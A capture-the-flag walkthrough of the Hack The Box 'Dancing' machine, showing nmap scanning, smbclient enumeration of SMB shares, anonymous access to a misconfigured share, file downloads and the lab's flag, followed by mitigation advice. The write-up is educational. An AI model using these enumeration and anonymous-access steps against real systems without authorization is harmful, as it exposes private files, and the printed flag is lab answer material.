# Dancing- Hack The Box Walkthrough

## Machine Information

| Category     | Details                                      |
| ------------ | -------------------------------------------- |
| Machine Name | **Dancing**                                  |
| Difficulty   | **Very Easy**                                |
| Platform     | **Hack The Box - Starting Point**            |
| Focus        | **SMB Enumeration & Anonymous Share Access** |

---

## Overview

**Dancing** is a beginner-friendly Hack The Box machine designed to introduce the fundamentals of **SMB (Server Message Block)** enumeration. The objective is to discover accessible SMB shares, identify a misconfigured share that allows anonymous access, and retrieve the flag stored within it.

This lab demonstrates how improperly configured SMB permissions can expose sensitive files to unauthorized users.

---

# Objectives

* Perform host discovery and service enumeration.
* Identify SMB-related services.
* Enumerate available SMB shares.
* Test share permissions.
* Access a misconfigured SMB share.
* Retrieve files from the share.
* Obtain the user flag.

---

# Understanding SMB

**Server Message Block (SMB)** is a network protocol primarily used by Windows systems for:

* File sharing
* Printer sharing
* Resource sharing
* Inter-process communication

SMB commonly operates over:

| Port    | Service                 |
| ------- | ----------------------- |
| 139/TCP | NetBIOS Session Service |
| 445/TCP | Microsoft-DS (SMB)      |

> SMB shares are essentially remote folders that can be accessed across a network. Misconfigured permissions may allow unauthorized users to access sensitive data.

---

# Phase 1: Information Gathering

## Verify VPN Connection

First, confirm that the Hack The Box VPN connection is active.

```bash
ip a
```

### Output

```bash
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>
    inet 10.10.14.107/23
```

### Analysis

The presence of the **tun0** interface confirms that the VPN tunnel is active and communication with HTB machines is possible.

---

# Phase 2: Service Enumeration

## Nmap Scan

Perform a service version scan against the target.

```bash
sudo nmap -sV 10.129.77.181
```

### Output

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0

Service Info: OS: Windows
```

### Analysis

The scan reveals several Windows services:

| Port | Service | Description                     |
| ---- | ------- | ------------------------------- |
| 135  | MSRPC   | Microsoft Remote Procedure Call |
| 139  | NetBIOS | SMB communication support       |
| 445  | SMB     | File sharing service            |
| 5985 | WinRM   | Windows Remote Management       |

The most interesting service is **SMB on port 445**, which suggests that file shares may be available for enumeration.

> SMB shares are often a valuable source of sensitive information and are a common target during penetration testing.

---

# Phase 3: SMB Enumeration

## Install SMB Client

If not already installed:

```bash
sudo apt-get install smbclient
```

This tool allows interaction with SMB shares from Linux systems.

---

## Enumerate Available Shares

List available SMB shares on the target.

```bash
smbclient -L 10.129.77.181
```

### Output

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

### Analysis

The target exposes four SMB shares:

| Share      | Purpose                     |
| ---------- | --------------------------- |
| ADMIN$     | Administrative share        |
| C$         | Default Windows drive share |
| IPC$       | Inter-process communication |
| WorkShares | Custom user-created share   |

The custom **WorkShares** share is particularly interesting because custom shares are often more susceptible to misconfiguration.

---

# Phase 4: Testing Share Access

## Attempt Access to ADMIN$

```bash
smbclient \\\\10.129.77.181\\ADMIN$
```

### Output

```bash
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### Result

Access denied.

---

## Attempt Access to C$

```bash
smbclient \\\\10.129.77.181\\C$
```

### Output

```bash
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### Result

Access denied.

---

## Attempt Access to WorkShares

```bash
smbclient \\\\10.129.77.181\\WorkShares
```

### Output

```bash
Try "help" to get a list of possible commands.

smb: \>
```

### Analysis

The SMB shell successfully opens without requiring valid credentials.

This indicates that the share allows:

* Guest access
* Anonymous authentication

> This is a classic SMB misconfiguration that exposes internal files to unauthenticated users.

---

# Phase 5: Exploring the Share

## View Available Directories

```bash
ls
```

### Output

```bash
Amy.J
James.P
```

Two user directories are available within the share.

---

## Investigate Amy.J Directory

Navigate into Amy's folder.

```bash
cd Amy.J
ls
```

### Output

```bash
worknotes.txt
```

Download the file.

```bash
get worknotes.txt
```

### Result

```bash
getting file \Amy.J\worknotes.txt
```

---

## Investigate James.P Directory

Return to the parent directory.

```bash
cd ..
```

Move into James's folder.

```bash
cd James.P
ls
```

### Output

```bash
flag.txt
```

Download the flag.

```bash
get flag.txt
```

### Result

```bash
getting file \James.P\flag.txt
```

Exit SMB.

```bash
exit
```

---

# Phase 6: Retrieve the Flag

Verify the downloaded files.

```bash
ls
```

### Output

```bash
flag.txt
worknotes.txt
```

Read the flag.

```bash
cat flag.txt
```

### Output

```text
5f61c10dffbc77a704d76016a22f1664
```

---

# Flag

```text
5f61c10dffbc77a704d76016a22f1664
```

---

# Key Findings

| Finding                             | Impact                   |
| ----------------------------------- | ------------------------ |
| SMB service exposed                 | Allows share enumeration |
| Anonymous access enabled            | Authentication bypass    |
| Sensitive files exposed             | Information disclosure   |
| Flag accessible without credentials | Unauthorized data access |

---

# Lessons Learned

This machine highlights several important penetration testing concepts:

1. **Always enumerate SMB services thoroughly.**
2. **Custom shares are often misconfigured.**
3. **Guest access can expose sensitive information.**
4. **Anonymous authentication should never be enabled unless absolutely necessary.**
5. **File shares frequently contain credentials, notes, and other valuable information.**

---

# Mitigation & Security Recommendations

To secure SMB environments:

### Disable Anonymous Access

Prevent guest and anonymous logins.

### Apply Least Privilege

Grant users access only to the shares they require.

### Audit Share Permissions

Regularly review:

* Read permissions
* Write permissions
* Guest access settings

### Disable Unused Shares

Remove unnecessary SMB shares to reduce attack surface.

### Monitor SMB Activity

Implement logging and alerting for:

* Anonymous logins
* Failed authentication attempts
* Unusual file access patterns

### Use Strong Authentication

Require:

* Domain authentication
* Strong passwords
* Multi-factor authentication where possible

---

# Conclusion

The **Dancing** machine provides an excellent introduction to SMB enumeration. By identifying a misconfigured SMB share that permitted anonymous access, it was possible to browse directories, download files, and retrieve the flag without valid credentials.

This lab reinforces a fundamental penetration testing lesson:

> **Misconfigured file shares can expose sensitive data even when no software vulnerability exists. Proper access control is critical for securing network resources.**
